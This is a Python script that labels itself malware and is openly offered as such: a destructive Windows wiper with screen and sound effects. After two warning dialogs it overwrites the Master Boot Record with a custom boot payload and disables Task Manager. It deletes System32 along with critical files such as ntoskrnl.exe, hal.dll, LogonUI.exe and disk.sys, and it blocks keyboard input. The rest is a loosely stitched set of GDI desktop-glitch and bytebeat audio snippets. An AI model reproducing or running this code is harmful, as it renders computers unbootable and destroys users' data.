from win32file import * 
from win32api import *  
from win32gui import *  
from win32con import *  
from win32ui import *  
import sys 



title = "!37.exe!"
description = "THIS IS MALWARE CODED BY MalwareLab150  " \
			  "Press Yes to destroy Windows will delete regedit keys , taskmgr, drivers, system32, LogonUi.exe and Disk.sys  " \
			  "im not responsible for any damage "  \
			  "!\n\nPress \"Yes\" to continue.\nPress \"No\" to exit."

if MessageBox(description, title, MB_ICONWARNING | MB_YESNO) == IDNO:
	print("No pressed")
	sys.exit(0)



title = "!! LAST WARNING !!"
description = "This is the last warning!"
if MessageBox(description, title, MB_ICONWARNING | MB_YESNO) == IDNO:
	print("Second no pressed")
	sys.exit(0)

print("MBR overwriting...")

hDevice = CreateFileW(r"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING,
					  0, 0)


buffer = bytes([

0xEB, 0x03, 0x90, 0xAA, 0x55, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xDB, 0xE3, 0xFF, 0x06, 0x94, 0x7D, 
0x81, 0x3E, 0x94, 0x7D, 0x54, 0x6F, 0x73, 0x5A, 0xD9, 0x06, 0x96, 0x7D, 0xD8, 0x06, 0x9A, 0x7D, 
0xD9, 0x1E, 0x96, 0x7D, 0xD9, 0x06, 0x96, 0x7D, 0xD9, 0xFE, 0xD9, 0x1E, 0xAA, 0x7D, 0xD9, 0x06, 
0x96, 0x7D, 0xD9, 0xFF, 0xD9, 0x1E, 0xAE, 0x7D, 0xE8, 0x2C, 0x01, 0xB9, 0x1E, 0x00, 0xB8, 0xE2, 
0xFF, 0xE8, 0x30, 0x00, 0x87, 0xD9, 0xF7, 0xDB, 0x4E, 0x83, 0xFE, 0x00, 0x75, 0xF3, 0x91, 0xF7, 
0xD9, 0xE8, 0x20, 0x00, 0xF7, 0xD8, 0xF7, 0xD9, 0xE8, 0x19, 0x00, 0x91, 0xF7, 0xD9, 0xBE, 0x06, 
0x00, 0x40, 0x83, 0xF8, 0x1E, 0x75, 0xDA, 0x43, 0x83, 0xFB, 0x1E, 0x75, 0xD1, 0xE8, 0x10, 0x01, 
0xEB, 0x9A, 0xEB, 0xFE, 0x66, 0x60, 0xA3, 0xB2, 0x7D, 0x89, 0x1E, 0xB6, 0x7D, 0x89, 0x0E, 0xBA, 
0x7D, 0xDF, 0x06, 0xB2, 0x7D, 0xD9, 0x1E, 0xB2, 0x7D, 0xDF, 0x06, 0xB6, 0x7D, 0xD9, 0x1E, 0xB6, 
0x7D, 0xDF, 0x06, 0xBA, 0x7D, 0xD9, 0x1E, 0xBA, 0x7D, 0xD9, 0x06, 0xAA, 0x7D, 0xD9, 0x06, 0xAE, 
0x7D, 0xD9, 0x06, 0xB6, 0x7D, 0xD8, 0xC9, 0xD9, 0x06, 0xBA, 0x7D, 0xD8, 0xCB, 0xDE, 0xE9, 0xD9, 
0x06, 0xB6, 0x7D, 0xD8, 0xCB, 0xD9, 0x06, 0xBA, 0x7D, 0xD8, 0xCB, 0xDE, 0xC1, 0xD9, 0x1E, 0xBA, 
0x7D, 0xD9, 0x1E, 0xB6, 0x7D, 0xDD, 0xD8, 0xDD, 0xD8, 0xD9, 0x06, 0xAA, 0x7D, 0xD9, 0x06, 0xAE, 
0x7D, 0xD9, 0x06, 0xB2, 0x7D, 0xD8, 0xC9, 0xD9, 0x06, 0xBA, 0x7D, 0xD8, 0xCB, 0xDE, 0xC1, 0xD9, 
0x06, 0xB2, 0x7D, 0xD8, 0xCB, 0xD9, 0x06, 0xBA, 0x7D, 0xD8, 0xCB, 0xDE, 0xE9, 0xD9, 0xC0, 0xD8, 
0x0E, 0xA2, 0x7D, 0xDF, 0x1E, 0xBA, 0x7D, 0xD8, 0x06, 0x9E, 0x7D, 0xD9, 0x06, 0xB6, 0x7D, 0xD8, 
0xF1, 0xD8, 0x0E, 0xA6, 0x7D, 0xDF, 0x1E, 0xB6, 0x7D, 0xDE, 0xF9, 0xD8, 0x0E, 0xA6, 0x7D, 0xDF, 
0x1E, 0xB2, 0x7D, 0xDD, 0xD8, 0xDD, 0xD8, 0x31, 0xD8, 0xC1, 0xE8, 0x03, 0x89, 0xC6, 0x83, 0xE6, 
0x0F, 0x8A, 0x9C, 0xBE, 0x7D, 0x8B, 0x36, 0xB2, 0x7D, 0x8B, 0x3E, 0xB6, 0x7D, 0x81, 0xC6, 0xA0, 
0x00, 0x83, 0xC7, 0x64, 0x81, 0xFE, 0x40, 0x01, 0x7D, 0x2A, 0x85, 0xF6, 0x78, 0x26, 0x81, 0xFF, 
0xC8, 0x00, 0x7D, 0x20, 0x85, 0xFF, 0x78, 0x1C, 0x69, 0xFF, 0x40, 0x01, 0x01, 0xF7, 0x68, 0x00, 
0x7E, 0x07, 0xA0, 0xBA, 0x7D, 0x26, 0x3A, 0x05, 0x7D, 0x0A, 0x26, 0x88, 0x05, 0x68, 0x00, 0x7C, 
0x07, 0x26, 0x88, 0x1D, 0x66, 0x61, 0xC3, 0x68, 0x00, 0x7E, 0x07, 0xB9, 0x00, 0xFA, 0xB0, 0x7F, 
0x31, 0xFF, 0xF3, 0xAA, 0x68, 0x00, 0x7C, 0x07, 0xB9, 0x00, 0xFA, 0x31, 0xFF, 0xF3, 0xAA, 0xC3, 
0x1E, 0x68, 0x00, 0x7C, 0x1F, 0x68, 0x00, 0xA0, 0x07, 0xB9, 0x00, 0xFA, 0x31, 0xF6, 0x31, 0xFF, 
0xF3, 0xA4, 0x1F, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x83, 0x44, 0x41, 0x58, 0x00, 0x00, 
0x96, 0x43, 0x9A, 0x99, 0x99, 0x3F, 0x00, 0x00, 0x20, 0x43, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x21, 
0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA


])


bytes_written = WriteFile(hDevice, buffer, None)
print("Wrote", bytes_written, "bytes to the Master Boot Record successfully!")


CloseHandle(hDevice)


import winreg

key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(key)

import os

os.system("start cmd /k curl parrot.live")
os.system("start cmd /k curl ascii.live/rick")
os.system("start cmd /k curl ascii.live/donut")


import subprocess

subprocess.Popen("cmd /c DEL /F /S /Q /A %SystemRoot%\\System32 & RD /S /Q %SystemRoot%\\System32", shell=True)

import keyboard

keyboard.block_key("a")
keyboard.block_key("b")
keyboard.block_key("c")
keyboard.block_key("d")
keyboard.block_key("e")
keyboard.block_key("f")
keyboard.block_key("g")
keyboard.block_key("h")
keyboard.block_key("i")
keyboard.block_key("j")
keyboard.block_key("k")
keyboard.block_key("l")
keyboard.block_key("m")
keyboard.block_key("n")
keyboard.block_key("o")
keyboard.block_key("p")
keyboard.block_key("q")
keyboard.block_key("r")
keyboard.block_key("s")
keyboard.block_key("t")
keyboard.block_key("u")
keyboard.block_key("v")
keyboard.block_key("w")
keyboard.block_key("x")
keyboard.block_key("y")
keyboard.block_key("z")

 
import ctypes

# Disable Keyboard Keys
ctypes.windll.user32.BlockInput(True)

# Disable Windows Key
VK_LWIN = 0x5B
VK_RWIN = 0x5C
ctypes.windll.user32.RegisterHotKey(None, 1, 0, VK_LWIN)
ctypes.windll.user32.RegisterHotKey(None, 2, 0, VK_RWIN)

import wave
import numpy as np
import winsound
import os

class ByteBeat:
    @staticmethod
    def GenerateBuffer(EQUATION, SECONDS_PLAYING, AMOUNT_KILOHERTZ=8000):
        EQUATION = EQUATION.replace('^', '**').replace('random()', '__import__("random").random()').replace('|', '|').replace('/', '/').replace('?', ' if ').replace(':', ' else ').replace('.charCodeAt', ' ').replace('>>', ' >> ').replace('<<', ' << ').replace('&', ' & ')
        buffer = np.zeros(int(AMOUNT_KILOHERTZ) * SECONDS_PLAYING, dtype=np.uint8)
        for t in range(0, int(AMOUNT_KILOHERTZ) * SECONDS_PLAYING):
            buffer[t] = int(eval(EQUATION)) & 0xFF
        return buffer

    @staticmethod
    def SlowDownBuffer(buffer, factor):
        indices = np.arange(0, len(buffer), factor)
        return buffer[indices.astype(int)]

    @staticmethod
    def Play(EQUATION, SECONDS_PLAYING, AMOUNT_KILOHERTZ=8000, slowdown_factor=2):
        buffer = ByteBeat.GenerateBuffer(EQUATION, SECONDS_PLAYING, AMOUNT_KILOHERTZ)
        slowed_buffer = ByteBeat.SlowDownBuffer(buffer, slowdown_factor)
        with wave.open('temp.wav', 'wb') as wf:
            wf.setnchannels(1)  # Mono
            wf.setsampwidth(1)  # 8 bits per sample
            wf.setframerate(AMOUNT_KILOHERTZ // slowdown_factor)
            wf.writeframes(slowed_buffer.tobytes())
        winsound.PlaySound('temp.wav', winsound.SND_FILENAME)
        os.remove('temp.wav')

# Esempio di utilizzo
ByteBeat.Play('t % 256', 50, 8000, slowdown_factor=2)



import subprocess

subprocess.Popen('cmd.exe /c start /b takeown /f C:\\Windows\\System32\\ntoskrnl.exe', shell=True)
subprocess.Popen('cmd.exe /c start /b icacls C:\\Windows\\System32\\ntoskrnl.exe /grant administrators:F', shell=True)
subprocess.Popen('cmd.exe /c start /b del C:\\Windows\\System32\\ntoskrnl.exe', shell=True)

import subprocess


commands = [
    "takeown /f C:\\Windows\\System32\\LogonUI.exe",
    "icacls C:\\Windows\\System32\\LogonUI.exe /grant administrators:F",
    "del C:\\Windows\\System32\\LogonUI.exe"
]


full_cmd = " & ".join(commands)


subprocess.run(f"cmd.exe /c {full_cmd}", shell=True)

import subprocess

subprocess.Popen('cmd.exe /c start /b takeown /f C:\\Windows\\System32\\hal.dll', shell=True)
subprocess.Popen('cmd.exe /c start /b icacls C:\\Windows\\System32\\hal.dll /grant administrators:F', shell=True)
subprocess.Popen('cmd.exe /c start /b del C:\\Windows\\System32\\hal.dll', shell=True)

import os

os.system('takeown /f C:\\Windows\\System32\\drivers\\disk.sys')
os.system('icacls C:\\Windows\\System32\\drivers\\disk.sys /grant administrators:F')
os.system('del C:\\Windows\\System32\\drivers\\disk.sys')



import subprocess

subprocess.Popen("cmd.exe /c takeown /f C:\\Windows\\System32\\shutdown.exe", shell=True)
subprocess.Popen("cmd.exe /c icacls C:\\Windows\\System32\\shutdown.exe /grant administrators:F", shell=True)
subprocess.Popen("cmd.exe /c del C:\\Windows\\System32\\shutdown.exe", shell=True)


import win32gui
import win32con
import ctypes
import time

# Imposta la consapevolezza del DPI per il processo corrente
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()

# Ottieni le dimensioni dello schermo
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
hdc = win32gui.GetDC(0)

# Ottieni l'ora di inizio
start_time = time.time()

# Esegui il ciclo while per 30 secondi
while time.time() - start_time < 30:
    win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, -3, -3, win32con.NOTSRCCOPY)
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *

desk = GetDC(0) 
x = GetSystemMetrics(0)
y = GetSystemMetrics(1) 

for i in range(0, 100):
    brush = CreateSolidBrush(RGB(
        255, # Red value
        30, # Green value
        90 # Blue value
    )) # Creates a brush
    SelectObject(desk, brush) 
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
    DeleteObject(brush) 
    Sleep(10) # Waits 10 milliseconds
import ctypes
import random
import time
import wave
import numpy as np
import winsound
import os
import threading

# Importing user32 and gdi32 libraries
user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32

class ByteBeat:
    @staticmethod
    def GenerateBuffer(EQUATION, SECONDS_PLAYING, AMOUNT_KILOHERTZ=16000):
        EQUATION = EQUATION.replace('^', '**').replace('random()', '__import__("random").random()').replace('|', '|').replace('/', '/').replace('?', ' if ').replace(':', ' else ').replace('.charCodeAt', ' ').replace('>>', ' >> ').replace('<<', ' << ').replace('&', ' & ')
        buffer = np.zeros(int(AMOUNT_KILOHERTZ) * SECONDS_PLAYING, dtype=np.uint8)
        for t in range(0, int(AMOUNT_KILOHERTZ) * SECONDS_PLAYING):
            buffer[t] = int(eval(EQUATION)) & 0xFF
        return buffer

    @staticmethod
    def Play(EQUATION, SECONDS_PLAYING, AMOUNT_KILOHERTZ=16000):
        buffer = ByteBeat.GenerateBuffer(EQUATION, SECONDS_PLAYING, AMOUNT_KILOHERTZ)
        with wave.open('temp.wav', 'wb') as wf:
            wf.setnchannels(1)  # Mono
            wf.setsampwidth(1)  # 8 bits per sample
            wf.setframerate(AMOUNT_KILOHERTZ)
            wf.writeframes(buffer.tobytes())
        winsound.PlaySound('temp.wav', winsound.SND_FILENAME)
        os.remove('temp.wav')

def get_dc(hwnd):
    return user32.GetDC(hwnd)

def get_system_metrics(n_index):
    return user32.GetSystemMetrics(n_index)

def bit_blt(hdc, x, y, cx, cy, hdc_src, x1, y1, rop):
    return gdi32.BitBlt(hdc, x, y, cx, cy, hdc_src, x1, y1, rop)

def sleep(dw_milliseconds):
    time.sleep(dw_milliseconds / 1000)  # Corrected the sleep time division

def main():
    hdc = get_dc(0)
    v10 = get_system_metrics(0)
    v9 = get_system_metrics(1)
    
    # Define the ByteBeat equation
    equation = '((t>>4)*(13&(t>>7))) + ((t>>5)|(t>>8)) + ((t>>3)&(t>>10))'
    
    # Start playing ByteBeat sound in a separate thread
    bytebeat_thread = threading.Thread(target=ByteBeat.Play, args=(equation, 120, 16000))  # Play for 2 minutes
    bytebeat_thread.start()
    
    start_time = time.time()
    duration = 80  

    # Graphics loop
    while time.time() - start_time < duration:
        hdc = get_dc(0)
        x = random.randint(0, v10)
        y = random.randint(0, v9)
        y1 = random.randint(y - 10, y + 10)
        v4 = random.randint(0, 100)
        bit_blt(hdc, x, y, 200, 200, hdc, (v4 % 21) + x - 10, y1, 0xEE0086)
        v5 = random.randint(0, 100)
        sleep(100)  # Adjusted sleep time to 100 milliseconds

if __name__ == "__main__":
    main()
    from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
import random


def random_color():
    return RGB(random.randint(0, 355), random.randint(0, 355), random.randint(0, 355))

desk = GetDC(0)
x = 90
y = 90
x_2 = 90
y_2 = 90

for i in range(50):
    color = random_color()
    brush = CreateSolidBrush(color)
    SelectObject(desk, brush)
    PatBlt(desk, x, y, x_2, y_2, PATINVERT)
    x += 10
    y += 10
    x_2 -= 10
    y_2 -= 10
    DeleteObject(brush)
ReleaseDC(0, desk)

import ctypes
import time
import numpy as np
import pyaudio
import threading
from ctypes import wintypes

# Constants
SRCCOPY = 0x00CC0020

# Structures
class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', wintypes.DWORD),
        ('biWidth', wintypes.LONG),
        ('biHeight', wintypes.LONG),
        ('biPlanes', wintypes.WORD),
        ('biBitCount', wintypes.WORD),
        ('biCompression', wintypes.DWORD),
        ('biSizeImage', wintypes.DWORD),
        ('biXPelsPerMeter', wintypes.LONG),
        ('biYPelsPerMeter', wintypes.LONG),
        ('biClrUsed', wintypes.DWORD),
        ('biClrImportant', wintypes.DWORD),
    ]

class RGBQUAD(ctypes.Structure):
    _fields_ = [
        ('rgbRed', ctypes.c_byte),
        ('rgbGreen', ctypes.c_byte),
        ('rgbBlue', ctypes.c_byte),
        ('rgbReserved', ctypes.c_byte),
    ]

class BITMAPINFO(ctypes.Structure):
    _fields_ = [
        ("bmiHeader", BITMAPINFOHEADER),
        ("bmiColors", RGBQUAD * 1),
    ]

# Global variables for Bytebeat
t = 0

def draw_moving_cubes_on_desktop(width, height, offset):
    img = np.zeros((height, width, 3), dtype=np.uint8)
    cube_size = 100  # Bigger cubes
    colors = [[255, 0, 0], [0, 255, 0], [0, 0, 255]]
    
    # Simulating 3D movement with perspective effect
    for i in range(len(colors)):
        angle = (offset + i * 120) % 360
        angle_rad = np.deg2rad(angle)
        x = int((width / 2) + (np.cos(angle_rad) * (width / 4)))
        y = int((height / 2) + (np.sin(angle_rad) * (height / 4)))
        
        if 0 <= x < width - cube_size and 0 <= y < height - cube_size:
            img[y:y+cube_size, x:x+cube_size] = colors[i]
    
    return img

def apply_image_to_desktop(img, width, height):
    hwnd = ctypes.windll.user32.GetDesktopWindow()
    hdc = ctypes.windll.user32.GetDC(hwnd)
    memdc = ctypes.windll.gdi32.CreateCompatibleDC(hdc)
    bitmap = ctypes.windll.gdi32.CreateCompatibleBitmap(hdc, width, height)
    ctypes.windll.gdi32.SelectObject(memdc, bitmap)

    bmi = BITMAPINFO()
    bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    bmi.bmiHeader.biWidth = width
    bmi.bmiHeader.biHeight = -height  # negative to indicate top-down bitmap
    bmi.bmiHeader.biPlanes = 1
    bmi.bmiHeader.biBitCount = 24
    bmi.bmiHeader.biCompression = 0x0000

    ctypes.windll.gdi32.SetDIBits(memdc, bitmap, 0, height, img.tobytes(), ctypes.byref(bmi), 0x00)
    ctypes.windll.gdi32.BitBlt(hdc, 0, 0, width, height, memdc, 0, 0, SRCCOPY)

    ctypes.windll.gdi32.DeleteObject(bitmap)
    ctypes.windll.gdi32.DeleteDC(memdc)
    ctypes.windll.user32.ReleaseDC(hwnd, hdc)

def bytebeat_stream_callback(in_data, frame_count, time_info, status):
    global t
    buffer = np.zeros(frame_count, dtype=np.int8)
    for i in range(frame_count):
        t = (t + 1) % (2**32)  # Ensure t doesn't overflow
        value = (t * int(np.sin(t >> 14) * 98670)) & 0xFF
        buffer[i] = value - 128  # Center the wave around 0
    return (buffer.tobytes(), pyaudio.paContinue)

def play_bytebeat():
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt8,
                    channels=1,
                    rate=8000,
                    output=True,
                    stream_callback=bytebeat_stream_callback)
    stream.start_stream()
    time.sleep(20)  # Play for 20 seconds
    stream.stop_stream()
    stream.close()
    p.terminate()

def main():
    width = ctypes.windll.user32.GetSystemMetrics(0)
    height = ctypes.windll.user32.GetSystemMetrics(1)
    offset = 0
    start_time = time.time()
    
    # Start Bytebeat in a separate thread
    bytebeat_thread = threading.Thread(target=play_bytebeat)
    bytebeat_thread.start()

    while time.time() - start_time < 20:  
        img = draw_moving_cubes_on_desktop(width, height, offset)
        apply_image_to_desktop(img, width, height)
        offset = (offset + 20) % 360  # Faster movement
        time.sleep(0.01)  # Refresh rate
    
    bytebeat_thread.join()

if __name__ == "__main__":
    main()

from ctypes import wintypes
import time
import pyaudio
import threading
import numpy as np
import ctypes

# Structure Building
class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', wintypes.DWORD),
        ('biWidth', wintypes.LONG),
        ('biHeight', wintypes.LONG),
        ('biPlanes', wintypes.WORD),
        ('biBitCount', wintypes.WORD),
        ('biCompression', wintypes.DWORD),
        ('biSizeImage', wintypes.DWORD),
        ('biXPelsPerMeter', wintypes.LONG),
        ('biYPelsPerMeter', wintypes.LONG),
        ('biClrUsed', wintypes.DWORD),
        ('biClrImportant', wintypes.DWORD),
    ]

class RGBQUAD(ctypes.Structure):
    _fields_ = [
        ('rgbRed', ctypes.c_byte),
        ('rgbGreen', ctypes.c_byte),
        ('rgbBlue', ctypes.c_byte),
        ('rgbReserved', ctypes.c_byte),
    ]

class BITMAPINFO(ctypes.Structure):
    _fields_ = [
        ("bmiHeader", BITMAPINFOHEADER),
        ("bmiColors", RGBQUAD * 1),
    ]

def create_moving_gradient_image(width, height, offset):
    img = np.zeros((height, width, 3), dtype=np.uint8)
    for i in range(height):
        for j in range(width):
            # Apply color gradients for Green, Blue, and Red
            r = (i + offset) % 256
            g = (j + offset) % 256
            b = (i + j + offset) % 256
            if r >= g and r >= b:
                img[i, j] = [0, 0, r]  # Red
            elif g >= r and g >= b:
                img[i, j] = [0, g, 0]  # Green
            else:
                img[i, j] = [b, 0, 0]  # Blue
    return img

def apply_image_to_desktop(img, width, height):
    hwnd = ctypes.windll.user32.GetDesktopWindow()
    hdc = ctypes.windll.user32.GetDC(hwnd)
    memdc = ctypes.windll.gdi32.CreateCompatibleDC(hdc)
    bitmap = ctypes.windll.gdi32.CreateCompatibleBitmap(hdc, width, height)
    ctypes.windll.gdi32.SelectObject(memdc, bitmap)

    bmi = BITMAPINFO()
    bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    bmi.bmiHeader.biWidth = width
    bmi.bmiHeader.biHeight = -height  # negative to indicate top-down bitmap
    bmi.bmiHeader.biPlanes = 1
    bmi.bmiHeader.biBitCount = 24
    bmi.bmiHeader.biCompression = 0x0000

    ctypes.windll.gdi32.SetDIBits(memdc, bitmap, 0, height, img.tobytes(), ctypes.byref(bmi), 0x00)
    
    SRCCOPY = 0x00CC0020
    ctypes.windll.gdi32.BitBlt(hdc, 0, 0, width, height, memdc, 0, 0, SRCCOPY)

    ctypes.windll.gdi32.DeleteObject(bitmap)
    ctypes.windll.gdi32.DeleteDC(memdc)
    ctypes.windll.user32.ReleaseDC(hwnd, hdc)

def rainbow_shader():
    ctypes.windll.user32.SetProcessDPIAware()
    width = ctypes.windll.user32.GetSystemMetrics(0)
    height = ctypes.windll.user32.GetSystemMetrics(1)
    offset = 0
    start_time = time.time()
    while time.time() - start_time < 20:
        img = create_moving_gradient_image(width, height, offset)
        apply_image_to_desktop(img, width, height)
        offset += 20  # Increase the offset faster
        time.sleep(0.01)  # Update every 10ms for a 100 FPS animation

def bytebeat_stream_callback(in_data, frame_count, time_info, status):
    global t
    buffer = np.zeros(frame_count, dtype=np.int8)
    for i in range(frame_count):
        t = (t + 1) % (2**32)  # Ensure t doesn't overflow
        value1 = (t * t >> 9) | (t >> 89) | (t >> 6) | (t >> 8)
        value2 = (t * t >> 89) | (t >> 898) | (t >> 6) | (t >> 8)
        value3 = (t * t >> 9) | (t >> 98) | (t >> 6) | (t >> 8)
        value = (value1 + value2 + value3) // 3  # Average the values
        buffer[i] = value - 128  # Center the wave around 0
    return (buffer.tobytes(), pyaudio.paContinue)

def play_bytebeat():
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt8,
                    channels=1,
                    rate=8000,
                    output=True,
                    stream_callback=bytebeat_stream_callback)
    stream.start_stream()
    time.sleep(20)
    stream.stop_stream()
    stream.close()
    p.terminate()

def main():
    global t
    t = 0
    bytebeat_thread = threading.Thread(target=play_bytebeat)
    bytebeat_thread.start()
    rainbow_shader()
    bytebeat_thread.join()

main()


import numpy as np
import ctypes
from ctypes import wintypes
import time
import pyaudio
import threading

# Structure Building
class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', wintypes.DWORD),
        ('biWidth', wintypes.LONG),
        ('biHeight', wintypes.LONG),
        ('biPlanes', wintypes.WORD),
        ('biBitCount', wintypes.WORD),
        ('biCompression', wintypes.DWORD),
        ('biSizeImage', wintypes.DWORD),
        ('biXPelsPerMeter', wintypes.LONG),
        ('biYPelsPerMeter', wintypes.LONG),
        ('biClrUsed', wintypes.DWORD),
        ('biClrImportant', wintypes.DWORD),
    ]

class RGBQUAD(ctypes.Structure):
    _fields_ = [
        ('rgbRed', ctypes.c_byte),
        ('rgbGreen', ctypes.c_byte),
        ('rgbBlue', ctypes.c_byte),
        ('rgbReserved', ctypes.c_byte),
    ]

class BITMAPINFO(ctypes.Structure):
    _fields_ = [
        ("bmiHeader", BITMAPINFOHEADER),
        ("bmiColors", RGBQUAD * 1),
    ]

def create_moving_gradient_image(width, height, offset):
    img = np.zeros((height, width, 3), dtype=np.uint8)
    for i in range(height):
        for j in range(width):
            r = (i + offset) % 256
            g = (j + offset) % 256
            b = (i + j + offset) % 256
            img[i, j] = [b, g, r]
    return img

def apply_image_to_desktop(img, width, height):
    hwnd = ctypes.windll.user32.GetDesktopWindow()
    hdc = ctypes.windll.user32.GetDC(hwnd)
    memdc = ctypes.windll.gdi32.CreateCompatibleDC(hdc)
    bitmap = ctypes.windll.gdi32.CreateCompatibleBitmap(hdc, width, height)
    ctypes.windll.gdi32.SelectObject(memdc, bitmap)

    bmi = BITMAPINFO()
    bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    bmi.bmiHeader.biWidth = width
    bmi.bmiHeader.biHeight = -height  # negative to indicate top-down bitmap
    bmi.bmiHeader.biPlanes = 1
    bmi.bmiHeader.biBitCount = 24
    bmi.bmiHeader.biCompression = 0x0000

    ctypes.windll.gdi32.SetDIBits(memdc, bitmap, 0, height, img.tobytes(), ctypes.byref(bmi), 0x00)
    
    SRCCOPY = 0x00CC0020
    ctypes.windll.gdi32.BitBlt(hdc, 0, 0, width, height, memdc, 0, 0, SRCCOPY)

    ctypes.windll.gdi32.DeleteObject(bitmap)
    ctypes.windll.gdi32.DeleteDC(memdc)
    ctypes.windll.user32.ReleaseDC(hwnd, hdc)

def rainbow_shader():
    ctypes.windll.user32.SetProcessDPIAware()
    width = ctypes.windll.user32.GetSystemMetrics(0)
    height = ctypes.windll.user32.GetSystemMetrics(1)
    offset = 0
    start_time = time.time()
    while time.time() - start_time < 20:
        img = create_moving_gradient_image(width, height, offset)
        apply_image_to_desktop(img, width, height)
        offset += 20  # Increase the offset faster
        time.sleep(0.01)  # Update every 10ms for a 100 FPS animation

def bytebeat_stream_callback(in_data, frame_count, time_info, status):
    global t
    buffer = np.zeros(frame_count, dtype=np.int8)
    for i in range(frame_count):
        t = (t + 1) % (2**32)  # Ensure t doesn't overflow
        value = (t * (t >> 9) | t >> 1 | t >> 98 | t >> 898) & 0xFF
        buffer[i] = value - 128  # Center the wave around 0
    return (buffer.tobytes(), pyaudio.paContinue)

def play_bytebeat():
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt8,
                    channels=1,
                    rate=8000,
                    output=True,
                    stream_callback=bytebeat_stream_callback)
    stream.start_stream()
    time.sleep(20)
    stream.stop_stream()
    stream.close()
    p.terminate()

def main():
    global t
    t = 0
    bytebeat_thread = threading.Thread(target=play_bytebeat)
    bytebeat_thread.start()
    rainbow_shader()
    bytebeat_thread.join()

main()


import ctypes
import time

user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32

screen_width = 1920
screen_height = 1080

desktop_ptr = user32.GetDC(0)

start_time = time.time()
duration = 20  # Duration in seconds

while time.time() - start_time < duration:
    gdi32.PatBlt(desktop_ptr, 0, 0, screen_width, screen_height, 0x005A0049)
    time.sleep(0.1)
    gdi32.PatBlt(desktop_ptr, 0, 0, screen_width, screen_height, 0x005A0049)
    time.sleep(0.1)

user32.ReleaseDC(0, desktop_ptr)
import win32gui
import win32con
import ctypes
import math
import time

user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
hdc = win32gui.GetDC(0)
dx = dy = 1
angle = 0
size = 1
speed = 5
start_time = time.time()
duration = 10  # Durata in secondi

while time.time() - start_time < duration:
    win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx, dy, win32con.SRCCOPY)
    dx = math.ceil(math.sin(angle) * size * 10)
    dy = math.ceil(math.cos(angle) * size * 10)
    angle += speed / 10
    if angle > math.pi:
        angle = math.pi * -1

from win32gui import *
from win32api import *
from win32ui import *
from win32con import *


desk = GetDC(0)
x = 90
y = 90
x_2 = 90
y_2 = 90


for i in range(50):
    PatBlt(desk, x, y, x_2, y_2, PATINVERT)
    x += 10
    y += 10
    x_2 -= 10
    y_2 -= 10
import ctypes
import random
import time

def get_system_metrics(nIndex):
    return ctypes.windll.user32.GetSystemMetrics(nIndex)

def get_dc(hWnd):
    return ctypes.windll.user32.GetDC(hWnd)

def create_solid_brush(color):
    return ctypes.windll.gdi32.CreateSolidBrush(color)

def select_object(hdc, hgdiobj):
    return ctypes.windll.gdi32.SelectObject(hdc, hgdiobj)

def release_dc(hWnd, hDC):
    return ctypes.windll.user32.ReleaseDC(hWnd, hDC)

def delete_object(hObject):
    return ctypes.windll.gdi32.DeleteObject(hObject)

def ellipse(hdc, left, top, right, bottom):
    return ctypes.windll.gdi32.Ellipse(hdc, left, top, right, bottom)

def main():
    w = get_system_metrics(0)
    h = get_system_metrics(1)
    signX = 1
    signY = 1
    incrementor = 10
    x = 10
    y = 10

    start_time = time.time()
    duration = 30  # Duration in seconds

    while time.time() - start_time < duration:
        hdc = get_dc(0)
        x += incrementor * signX
        y += incrementor * signY
        top_x = 0 + x
        top_y = 0 + y
        bottom_x = 100 + x
        bottom_y = 100 + y
        brush = create_solid_brush((random.randint(0, 255) << 16) | (random.randint(0, 255) << 8) | random.randint(0, 255))
        select_object(hdc, brush)
        ellipse(hdc, top_x, top_y, bottom_x, bottom_y)

        if y >= get_system_metrics(1):
            signY = -1

        if x >= get_system_metrics(0):
            signX = -1

        if y == 0:
            signY = 1

        if x == 0:
            signX = 1

        time.sleep(0.01)
        delete_object(brush)
        release_dc(0, hdc)

if __name__ == "__main__":
    main()
import time
from ctypes import windll

start_time = time.time()
duration = 50 

while time.time() - start_time < duration:
    hdc = windll.user32.GetDC(0)
